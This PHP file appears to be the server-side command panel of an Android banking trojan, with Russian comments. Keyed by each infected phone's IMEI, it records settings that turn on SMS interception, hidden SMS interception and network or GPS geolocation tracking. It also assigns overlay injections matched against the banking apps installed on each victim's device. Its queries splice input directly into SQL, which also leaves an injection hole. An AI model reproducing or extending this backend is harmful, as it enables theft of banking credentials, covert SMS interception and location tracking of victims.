<?php
	//передаем данные для выпонения команд!!!-----
	$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
	include 'crypt.php';
	include 'config.php';
	$request = decrypt($request,cryptKey);
if((!preg_match("/script/",$request)) && (!preg_match("/base64/",$request)) ) {
	$massivReq = explode(":", $request);
	/*
	* 0 IMEI
	* 1 Название настройки
	* 2 Параметры
	*/
	$IMEI = isset($massivReq[0]) ? $massivReq[0] : "";
	$name =isset($massivReq[1]) ? $massivReq[1] : "";
	$params = isset($massivReq[2]) ? $massivReq[2] : "";

	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$statement = $connection->prepare("SELECT IMEI FROM settings WHERE IMEI='$IMEI'");
	$statement->execute([$IMEI]);

	$booIMEI = false;

	foreach($statement as $row)
	{
		if($row['IMEI']==$IMEI)
		{
			$booIMEI=true;
			break;
		}
	}

	if($booIMEI == false){
	/*
	avtootvet_true  -  On/off interception SMS
	del_sms  -  On/off hidden SMS interception
	avtootvet_sig1 - On/off geolocation NETWORK
	avtootvet_sig2 - On/off geolocation GPS
	*/
		if($name=="InterceptionSMS"){
			$statement = $connection->prepare("insert into settings (IMEI, inject, del_sms, state, avtootvet_true, avtootvet_sig1, avtootvet_sig2)
			value ('$IMEI','','','1','$params','','')");
			$statement->execute(array($IMEI,$params));
		}elseif($name=="HideInterceptionSMS"){

			$statement = $connection->prepare("insert into settings (IMEI, inject, del_sms, state, avtootvet_true, avtootvet_sig1, avtootvet_sig2)
			value ('$IMEI','','$params','1','','','')");
			$statement->execute(array($IMEI,$params));

		}elseif($name=="Geolocation"){

			$statement = $connection->prepare("insert into settings (IMEI, inject, del_sms, state, avtootvet_true, avtootvet_sig1, avtootvet_sig2)
			value ('$IMEI','','','1','','$params','$params')");
			$statement->execute(array($IMEI,$params));

		}elseif($name=="autoInj"){

			$grabs = str_replace("|","/",$params);
			$inj="";
			$getAppsBanks="";

			$statement = $connection->prepare("SELECT IMEI, bank FROM kliets WHERE IMEI='$IMEI'");
			$statement->execute([$IMEI]);

			foreach($statement as $row)
			{
				if(strcmp($IMEI,$row['IMEI']) == 0)
				{
					$getAppsBanks=$row['bank'];
					break;
				}
			}

			if($getAppsBanks!="")
			{
				$statement = $connection->prepare("SELECT id, process FROM injection");
				$statement->execute();

				$massivAppsBanks = explode(",", $getAppsBanks);
				foreach($statement as $row){

					$getProcess =$row['process'];

					foreach($massivAppsBanks as $app){

						if((strlen($app)>=2)&&(preg_match("/$app/",$getProcess))){

							$getInj = $row['id'];
							$inj= "$inj/$getInj";
						}
					}
				}
				if(strcmp($inj,"/") != 0){
					$grabs="$grabs$inj";
				}
			}
			$statement = $connection->prepare("insert into settings (IMEI, inject, del_sms, state, avtootvet_true, avtootvet_sig1, avtootvet_sig2)
			value ('$IMEI','$grabs','','1','','','')");
			$statement->execute(array($IMEI,$grabs));

		}elseif($name=="Inj"){

			$params = str_replace("|","/",$params);

			$statement = $connection->prepare("insert into settings (IMEI, inject, del_sms, state, avtootvet_true, avtootvet_sig1, avtootvet_sig2)
			value ('$IMEI','$params','','1','','','')");
			$statement->execute(array($IMEI,$params));
		}


	}else{


	if($name=="InterceptionSMS"){
			$statement = $connection->prepare("UPDATE settings SET avtootvet_true = '$params', state='1' WHERE IMEI = '$IMEI'");
			$statement->execute(array($IMEI,$params));
		}elseif($name=="HideInterceptionSMS"){
			$statement = $connection->prepare("UPDATE settings SET del_sms='$params', state='1' WHERE IMEI = '$IMEI'");
			$statement->execute(array($IMEI,$params));
		}elseif($name=="Geolocation"){
			$statement = $connection->prepare("UPDATE settings SET avtootvet_sig1 = '$params', state='1', avtootvet_sig2 = '$params' WHERE IMEI = '$IMEI'");
			$statement->execute(array($IMEI,$params));
		}elseif($name=="autoInj"){

			$grabs = str_replace("|","/",$params);
			$inj="";
			$getAppsBanks="";

			$statement = $connection->prepare("SELECT IMEI, bank FROM kliets WHERE IMEI='$IMEI'");
			$statement->execute([$IMEI]);

			foreach($statement as $row)
			{
				if(strcmp($IMEI,$row['IMEI']) == 0)
				{
					$getAppsBanks=$row['bank'];
					break;
				}
			}

			if($getAppsBanks!="")
			{
				$statement = $connection->prepare("SELECT id, process FROM injection");
				$statement->execute();

				$massivAppsBanks = explode(",", $getAppsBanks);
				foreach($statement as $row){
					$getProcess =$row['process'];
					foreach($massivAppsBanks as $app){
						if((strlen($app)>=2)&&(preg_match("/$app/",$getProcess))){

							$getInj = $row['id'];
							$inj= "$inj/$getInj";
						}
					}
				}
				if(strcmp($inj,"/") != 0){
					$grabs="$grabs$inj";
				}
			}
			//------Собираем в настройках и новые найденые инжекты-------
			$statement = $connection->prepare("SELECT IMEI, inject FROM settings");
			$statement->execute();
			$getInjSetting="";
			foreach($statement as $row){
				if(strcmp($IMEI,$row['IMEI']) == 0){
					$getInjSetting=$row['inject'];
					break;
				}
			}
			$InjetionSettings="";
			if($getInjSetting != ""){
				$massivgetInjSetting = explode("/", $getInjSetting);
				$massivgrabs = explode("/", $grabs);

				foreach($massivgetInjSetting as $injSetting){
					$boolInj=true;
					foreach($massivgrabs as $grab){
						if($injSetting==$grab){
							$boolInj=false;
							break;
						}
					}

					if($boolInj){
						$InjetionSettings="$InjetionSettings/$injSetting";
					}
				}
				$grabs="$InjetionSettings/$grabs";
			}

			$statement = $connection->prepare("UPDATE settings SET inject='$grabs', state='1' WHERE IMEI = '$IMEI'");
			$statement->execute(array($IMEI,$grabs));
		}elseif($name=="Inj"){
			$params = str_replace("|","/",$params);

			//------Собираем в настройках и новые найденые инжекты-------
			$statement = $connection->prepare("SELECT IMEI, inject FROM settings");
			$statement->execute();
			$getInjSetting="";
			foreach($statement as $row){
				if(strcmp($IMEI,$row['IMEI']) == 0){
					$getInjSetting=$row['inject'];
					break;
				}
			}
			$InjetionSettings="";
			if($getInjSetting != ""){
				$massivgetInjSetting = explode("/", $getInjSetting);
				$massivgrabs = explode("/", $params);

				foreach($massivgetInjSetting as $injSetting){
					$boolInj=true;
					foreach($massivgrabs as $inj){
						if($injSetting==$inj){
							$boolInj=false;
							break;
						}
					}

					if($boolInj){
						$InjetionSettings="$InjetionSettings/$injSetting";
					}
				}
				$params="$InjetionSettings/$params";
			}

			$statement = $connection->prepare("UPDATE settings SET inject='$params', state='1' WHERE IMEI = '$IMEI'");
			$statement->execute(array($IMEI,$params));
		}
	}
}
	echo "<tag>2453512</tag>";
?>
